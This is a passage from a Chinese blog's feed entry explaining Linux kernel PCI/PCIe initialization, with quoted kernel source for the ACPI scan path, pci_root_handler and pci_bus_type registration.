class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pcibus_class_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 注册 pci_bus class，创建 sysfs 下的 class/pci_bus 目录</span><br>↓<br><span class="hljs-function"><span class="hljs-title">pci_driver_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 注册 pci_bus_type，创建 sysfs 下的 bus/pci 目录</span><br>↓<br><span class="hljs-function"><span class="hljs-title">acpi_pci_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 注册 acpi_pci_bus，并设置电源管理的相应操作</span><br>↓<br><span class="hljs-function"><span class="hljs-title">acpi_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// pcie 初始化入口，进行设备识别与模型建立</span><br></code></pre></td></tr></table></figure><p>这里我们挑其中关键的几个来看，首先是 <code>acpi_init()</code>，存在如下调用路径：</p><blockquote><p>前置知识：ACPI 规范</p></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">acpi_init</span>()<br><span class="hljs-built_in">pci_mmcfg_late_init</span>() <span class="hljs-comment">// 扫描 MCFG 表，获取所有设备PCI配置空间的基地址</span><br><span class="hljs-built_in">acpi_scan_init</span>()<br><span class="hljs-built_in">acpi_pci_root_init</span>()<br><span class="hljs-built_in">acpi_scan_add_handler_with_hotplug</span>()<span class="hljs-comment">// 添加 handler：pci_root_handler</span><br><span class="hljs-built_in">acpi_bus_scan</span>()<span class="hljs-comment">// 设备扫描，创建 ACPI 设备节点对象</span><br><span class="hljs-built_in">acpi_bus_attach</span>()<span class="hljs-comment">// 处理单个节点并调用 acpi_bus_attach() 处理子节点（DFS）</span><br><span class="hljs-built_in">acpi_scan_attach_handler</span>()<span class="hljs-comment">// 查找匹配的 handler 并调用 attach 指针</span><br>handler-&gt;<span class="hljs-built_in">attach</span>(device, devid)<br></code></pre></td></tr></table></figure><p>那么现在我们来看对应的 handler，为在 <code>acpi_scan_add_handler_with_hotplug()</code> 中注册的 <code>pci_root_handler</code> ，该变量定义于 <code>/drivers/acpi/pci_host.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">acpi_scan_handler</span> <span class="hljs-title">pci_root_handler</span> =</span> &#123;<br>.ids = root_device_ids,<br>.attach = acpi_pci_root_add,<br>.detach = acpi_pci_root_remove,<br>.hotplug = &#123;<br>.enabled = <span class="hljs-literal">true</span>,<br>.scan_dependent = acpi_pci_root_scan_dependent,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>于是最后调用到 <code>acpi_pci_root_add()</code>，为设备节点创建对应的内核结构体</p><blockquote><p>这个函数中间其实还有一些过程，<del>但是👴摸了</del></p></blockquote><p>接下来我们来看 <code>pci_driver_init()</code>，该函数在内核驱动模型中注册了 PCI 总线，并定义了相关的操作函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">pci_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br>ret = bus_register(&amp;pci_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PCIEPORTBUS</span><br>ret = bus_register(&amp;pcie_port_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>dma_debug_add_bus(&amp;pci_bus_type);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>postcore_initcall(pci_driver_init);<br></code></pre></td></tr></table></figure><p>该函数中调用了 <code>bus_register()</code> 来注册 PCI 总线，对应到符合内核设备驱动模型的总线类型的变量为 <code>pci_bus_type</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus_type</span> <span class="hljs-title">pci_bus_type</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;pci&quot;</span>,<br>.match= pci_bus_match,<br>.uevent= pci_uevent,<br>.probe= pci_device_probe,<br>.remove= pci_device_remove,<br>.shutdown= pci_device_shutdown,<br>.dev_groups= pci_dev_groups,<br>.bus_groups= pci_bus_groups,<br>.drv_groups= pci_drv_groups,<br>.pm= PCI_PM_OPS_PTR,<br>.num_vf= pci_bus_num_vf,<br>.dma_configure= pci_dma_configure,<br>.dma_cleanup= pci_dma_cleanup,<br>&#125;;<br>EXPORT_SYMBOL(pci_bus_type);<br></code></pre></td></tr></table></figure><h2 id="二、设备驱动框架"><a href="#二、设备驱动框架" class="headerlink" title="二、设备驱动框架"></a>二、设备驱动框架</h2><h2 id="三、PCI-probe-设备识别"><a href="#三、PCI-probe-设备识别" class="headerlink" title="三、PCI probe - 设备识别"></a>三、PCI probe - 设备识别</h2><h2 id="四、PCI-remove-设备移除"><a href="#四、PCI-remove-设备移除" class="headerlink" title="四、PCI remove - 设备移除"></a>四、PCI remove - 设备移除</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;👴等会把你总线都给扬了&lt;/p&gt;</summary>
    
    
    
    <category term="HARDWARE" scheme="https://arttnba3.github.io/categories/HARDWARE/"/>
    
    
    <category term="PCI" scheme="https://arttnba3.github.io/tags/PCI/"/>
    
    <category term="计算机组成原理" scheme="https://arttnba3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    <category term="Linux Driver" scheme="https://arttnba3.github.io/tags/Linux-Driver/"/>
    
  </entry>
  
</feed>
